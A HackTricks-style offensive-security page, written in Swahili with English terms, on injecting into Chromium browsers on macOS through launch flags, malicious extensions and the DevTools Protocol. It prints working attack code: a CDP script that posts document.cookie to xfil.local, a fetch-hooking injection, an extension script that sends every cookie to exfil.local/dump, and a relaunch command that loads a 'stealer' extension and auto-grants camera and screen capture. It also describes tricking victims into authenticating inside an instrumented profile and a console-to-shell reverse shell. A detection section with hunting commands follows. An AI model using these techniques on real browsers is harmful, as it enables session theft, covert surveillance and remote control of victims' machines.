# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Maelezo ya Msingi

Browsers zinazotegemea Chromium kama Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, na Opera zote hutumia command-line switches, preference files, na DevTools automation interfaces zilezile. Kwenye macOS, mtumiaji yeyote mwenye GUI access anaweza kusitisha browser session iliyopo na kuifungua tena kwa arbitrary flags, extensions, au DevTools endpoints zinazoendeshwa kwa entitlements za mlengwa.

#### Kuzindua Chromium kwa custom flags kwenye macOS

macOS huhifadhi UI instance moja kwa kila Chromium profile, kwa hivyo instrumentation kwa kawaida huhitaji kufunga browser kwa nguvu (kwa mfano kwa `osascript -e 'tell application "Google Chrome" to quit'`). Attackers kwa kawaida huzindua tena kupitia `open -na "Google Chrome" --args <flags>` ili waweze kuingiza arguments bila kurekebisha app bundle. Kuweka command hiyo ndani ya user LaunchAgent (`~/Library/LaunchAgents/*.plist`) au login hook huhakikisha browser iliyochezewa inazinduliwa tena baada ya reboot/logoff.

#### `--load-extension` Flag

`--load-extension` flag hupakia kiotomatiki extensions ambazo hazijapakiwa (comma-separated paths). Iunganishe na `--disable-extensions-except` ili kuzuia extensions halali huku ukilazimisha payload yako pekee iendeshe. Malicious extensions zinaweza kuomba high-impact permissions kama `debugger`, `webRequest`, na `cookies` ili kuingia kwenye DevTools protocols, kurekebisha CSP headers, kushusha kiwango cha HTTPS, au ku-exfiltrate session material mara tu browser inapoanza.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Switches hizi hufichua Chrome DevTools Protocol (CDP) kupitia TCP au pipe ili external tooling iweze kuendesha browser. Google iliona matumizi makubwa ya infostealer kwenye interface hii na, kuanzia Chrome 136 (Machi 2025), switches hizi hupuuzwa kwa default profile isipokuwa browser izinduliwe kwa `--user-data-dir` isiyo ya kawaida. Hii hulazimisha App-Bound Encryption kwenye real profiles, lakini attackers bado wanaweza kuanzisha fresh profile, kumshawishi victim athenticate ndani yake (phishing/triage assistance), na kuvuna cookies, tokens, device trust states, au WebAuthn registrations kupitia CDP.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

Flag hii huelekeza browser profile nzima (History, Cookies, Login Data, Preference files, na kadhalika) kwenye attacker-controlled path. Ni lazima inapotumiwa pamoja na `--remote-debugging-port` kwenye modern Chrome builds, na pia hutenga tampered profile ili uweze kuweka `Preferences` au `Secure Preferences` files zilizo na taarifa za awali zinazozima security prompts, kusakinisha extensions kiotomatiki, na kubadilisha default schemes.

#### `--use-fake-ui-for-media-stream` Flag

Switch hii hupita camera/mic permission prompt, hivyo ukurasa wowote unaoita `getUserMedia` hupata access mara moja. Iunganishe na flags kama `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, au CDP `Browser.grantPermissions` commands ili kunasa audio/video, kushiriki desktop, au kutimiza WebRTC permission checks kimya bila user interaction.

## Delivery & Relaunch Patterns Zinazoonekana Hadharani

CDP abuse kwa kawaida ni hatua ya **post-exploitation** badala ya payload ya awali. Kampeni ya hivi karibuni ya macOS iliyolenga developers ilitumia Xcode **`Run Script` build phase** yenye sumu (`PBXShellScriptBuildPhase`) ili code itekelezwe tu victim alipofanya **build** ya project, na si wakati alipo-clone au kuifungua tu. Baada ya execution ya kwanza, malware pia iliambukiza miti mingine ya `.xcodeproj`, ikaongeza malicious Git `pre-commit` hooks, na kutafuta Xcode projects zaidi ndani ya ZIP archives.<sup>[[3]](#references)</sup>

Kwa Chromium abuse, jambo hili ni muhimu kwa sababu attacker hahitaji kurekebisha browser binary yenyewe. Build-phase / `osascript` stager ya muda mfupi badala yake inaweza kusakinisha **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher, na kadhalika) inayofungua tena browser halali kwa flags zinazodhibitiwa na attacker kila mara user anapoianzisha.<sup>[[3]](#references)</sup>

> [!TIP]
> Kwenye developer endpoints, kagua files za `.pbxproj`, `.git/hooks/pre-commit`, na ZIPs zenye `.xcodeproj` ili kutafuta `curl`, `osascript`, `xxd`, `base64` iliyowekwa ndani mara nyingi, au logic isiyotarajiwa ya kuanzisha tena Chrome.

## Remote Debugging & DevTools Protocol Abuse

Baada ya Chrome kuzinduliwa tena kwa `--user-data-dir` maalum na `--remote-debugging-port`, unaweza kujiunga kupitia CDP (kwa mfano kupitia `chrome-remote-interface`, `puppeteer`, au `playwright`) na kuscript workflows zenye high privilege:

- **Cookie/session theft:** `Network.getAllCookies` na `Storage.getCookies` hurudisha HttpOnly values hata wakati App-Bound encryption kwa kawaida ingezuia filesystem access, kwa sababu CDP huomba browser inayoendesha izidecrypt.
- **Permission tampering:** `Browser.grantPermissions` na `Emulation.setGeolocationOverride` hukuruhusu kupita camera/mic prompts (hasa zikitumiwa pamoja na `--use-fake-ui-for-media-stream`) au kughushi location-based security checks.
- **Keystroke/script injection:** `Runtime.evaluate` hutekeleza arbitrary JavaScript ndani ya active tab, ikiwezesha credential lifting, DOM patching, au kuingiza persistence beacons zinazoendelea baada ya navigation.<sup>[[1]](#references)</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` na `Fetch.enable` hukatiza authenticated requests/responses kwa real time bila kugusa disk artifacts.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Kwa sababu Chrome 136 huzuia CDP kwenye profile chaguo-msingi, kunakili directory iliyopo ya mwathiriwa ya `~/Library/Application Support/Google/Chrome` kwenda kwenye staging path hakusababishi tena cookies zilizodecryptiwa. Badala yake, mshawishi mtumiaji kuthibitisha utambulisho wake ndani ya profile iliyowekewa instrumentation (kwa mfano, kupitia session ya "msaada" inayoonekana kuwa ya manufaa) au capture MFA tokens zikiwa transit kupitia network hooks zinazodhibitiwa na CDP.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Mfumo wa vitendo wa malware ni:

1. Anzisha upya userland implant au wrapper kila Chrome inapozinduliwa.
2. Anzisha browser halali kwa `--remote-debugging-port=<port>` na, kwenye Chrome 136+, kwa kawaida iambatanishe na `--user-data-dir=<dir>` isiyo ya chaguo-msingi.
3. Anzisha helper inayounganisha kwenye CDP WebSocket ya ndani na kusajili pre-document hook kwa kutumia `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Helper huyo anaweza kuingiza JavaScript **kabla** site code haijaanza kutekelezwa, jambo linalofaa kwa ku-hook `window.fetch`, `XMLHttpRequest`, wallet providers, au autofill flows bila kurekebisha files zilizo kwenye disk.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Toleo lenye nguvu zaidi hugeuza browser kuwa **host command bridge**: JavaScript iliyo-injected hutoa `console.log` yenye delimiter, helper wa ndani hufuatilia `Runtime.consoleAPICalled`, huondoa marker, hutekeleza sehemu iliyobaki kupitia host shell (kwa mfano `exec.Command` ya Go), na kurudisha stdout/stderr kupitia WebSocket ya mshambuliaji. Hii huboresha utekelezaji wa script wa kiwango cha tab hadi reverse shell ambayo kwa kiasi kikubwa haina faili.<sup>[[3]](#references)</sup>

## Extension-Based Injection via Debugger API

Utafiti wa 2023 wa "Chrowned by an Extension" ulionyesha kwamba extension hasidi inayotumia API ya `chrome.debugger` inaweza kujiunga na tab yoyote na kupata uwezo uleule wa DevTools kama `--remote-debugging-port`.<sup>[[6]](#references)</sup> Hilo linavunja dhana za awali za isolation (extensions hubaki katika context yao) na kuwezesha:

- Wizi wa kimya wa cookies na credentials kwa `Network.getAllCookies`/`Fetch.getResponseBody`.
- Kubadilishwa kwa site permissions (camera, microphone, geolocation) na security interstitial bypass, hivyo kuruhusu phishing pages kuiga dialogs za Chrome.
- Kuharibiwa kwa on-path kwa TLS warnings, downloads, au WebAuthn prompts kwa kuendesha programmatically `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, au `Security.handleCertificateError`.

Load extension kwa `--load-extension`/`--disable-extensions-except` ili mtumiaji asihitajike kufanya interaction yoyote. Background script ndogo inayotumia API hii vibaya inaonekana hivi:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Extension pia inaweza kujisajili kwa matukio ya `Debugger.paused` ili kusoma vigezo vya JavaScript, kurekebisha inline scripts, au kuweka breakpoints maalum zinazoendelea hata baada ya navigation. Kwa kuwa kila kitu huendeshwa ndani ya kikao cha GUI cha mtumiaji, Gatekeeper na TCC hazichochewi, hivyo mbinu hii ni bora kwa malware ambayo tayari imepata execution chini ya muktadha wa mtumiaji.<sup>[[6]](#references)</sup>

## Utambuzi na Utafutaji

- Weka alert kwa browsers za Chromium zinazoanzishwa na `--remote-debugging-port`, `--remote-debugging-pipe`, au `--user-data-dir` yenye mashaka, hasa pale parent inapokuwa `bash`, `sh`, `osascript`, `xcodebuild`, au LaunchAgent helper.
- Tafuta chains fupi ambapo helper hufungua CDP WebSocket ya ndani, husajili `Page.addScriptToEvaluateOnNewDocument`, kisha huanzisha muunganisho wa muda mrefu wa nje kupitia WebSocket/HTTPS.
- Tafuta madaraja ya console-to-shell kwa kuoanisha shughuli za browser za `Runtime.consoleAPICalled` na child shells au helper processes zinazotekeleza commands zilizotolewa na mshambuliaji.
- Kwenye Macs za developers, kagua entries za `PBXShellScriptBuildPhase` za `.pbxproj`, Git `pre-commit` hooks, vianzisha upya vya Dock/login item, na miradi ya Xcode iliyomo ndani ya ZIP kwa ajili ya browser wrapper installation.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Zana

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Huwezesha uanzishaji wa Chromium kiotomatiki kwa payload extensions na hufichua CDP hooks shirikishi.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Tooling inayofanana, inayolenga traffic interception na browser instrumentation kwa waendeshaji wa macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js library ya kuandika scripts za Chrome DevTools Protocol dumps (cookies, DOM, permissions) mara tu instance ya `--remote-debugging-port` inapokuwa live.

### Mfano
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Pata mifano zaidi katika links za tools.

## Marejeleo

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
